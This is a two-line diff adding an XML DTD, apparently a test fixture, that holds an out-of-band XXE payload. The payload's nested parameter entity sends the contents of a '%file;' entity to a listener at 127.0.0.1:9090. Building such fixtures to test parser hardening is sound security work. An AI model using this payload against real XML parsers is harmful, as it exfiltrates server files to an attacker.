@@ -1,0 +1,2 @@
+<?xml version="1.0"?>
+<!ENTITY % aa "<!ENTITY gogo SYSTEM 'http://127.0.0.1:9090/landing?text=%file;'>">%aa;
